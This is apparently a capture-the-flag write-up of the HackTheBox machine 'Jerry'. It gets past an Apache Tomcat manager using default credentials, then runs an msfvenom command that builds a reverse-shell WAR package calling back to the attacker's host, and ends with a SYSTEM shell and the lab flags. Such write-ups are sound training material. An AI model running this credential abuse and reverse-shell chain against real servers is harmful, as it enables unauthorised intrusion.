---
title: Jerry Machine Writeup- HackTheBox
date: 2020-12-3 10:30:00
excerpt: A retired windows box from HackTheBox, owned by abusing default password in Apache Tomcat installation and
         deploying a war package.
thumbnail: /assets/images/Jerry/info.png
categories:
- HTB
- Writeup
- Machine
tags:
- Windows
- Apache Tomcat
- war deployment
- without metasploit
---

![Info](/assets/images/Jerry/info.png)

# Methodology
1. Open Ports Enumeration
2. Web Service Enumeration
3. Default credentials identified
4. Reverse shell deployed as 'war' package
5. Foothold gained as SYSTEM user

# Lessons Learned
1. Identifying Apache Tomcat default credentials
2. Deploying reverse shell as war package

# Open Ports Enumeration
The open ports enumeration through targetRecon[^fn1], had identified only one open port, web service, **HTTP** (8080). 
The scan had not identified any known vulnerabilities through vulnerability scan. The results of the scan are given 
below.
``` 
~/HTB/Tracks/Beginner/Jerry/ targetRecon 10.10.10.95
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
		8080    http-proxy
[+] Scripts Scan
				 nmap -sV -A --script=default,vuln -p 8080 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-03 15:35 IST
Nmap scan report for 10.10.10.95 (10.10.10.95)
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 563.19 seconds

[+] Summary 
8080    http-proxy      Apache Tomcat/Coyote JSP engine 1.1
				No vuln found
```

# Web Service Enumeration
Browsing to [http://10.10.10.95:8080](http://10.10.10.95:8080) revealed an *Apache Tomcat* installation, with a link to 
[Manager App](http://10.10.10.95:8080/manager/html). The error page, received after attempting multiple wrong 
credentials revealed the default credentials **tomcat:s3cret**. The same is shown on the image given below.

![Default Credentials](/assets/images/Jerry/manager.png)

# Foothold
Using the default credentials gave access to the **Admin Panel** of Apache Tomcat installation. A *reverse shell*, as a
**war package** was then generated using **msfvenom** as shown on the following command.
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=9095 -f war > revShell.war
```
The *war* package was then uploaded through the admin panel. A *netcat* listener on port 9095 was initiated, and the 
reverse shell was triggered by visiting [http://10.10.10.95:8080/revShell/](http://10.10.10.95:8080/revShell/). This 
resulted in a shell, as a **SYSTEM** user being caught on the listener. The same is shown on the section given below.
```shell
b4bygroot@arcolinux:~/HTB/Tracks/Beginner/Jerry % nc -nvlp 9095                                                                           
Connection from 10.10.10.95:49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system


b4bygroot@arcolinux:~/HTB/Tracks/Beginner/Jerry % nc -nvlp 9095
Connection from 10.10.10.95:49195
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>cd C:\Users\Administrator\Desktop\flags
cd C:\Users\Administrator\Desktop\flags

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
![SYSTEM Shell](/assets/images/Jerry/flags.png)

# System Owned
![System Owned](/assets/images/Jerry/systemown.png)

# Resources
[^fn1]:[targetRecon](https://github.com/b4bygroot/TargetRecon)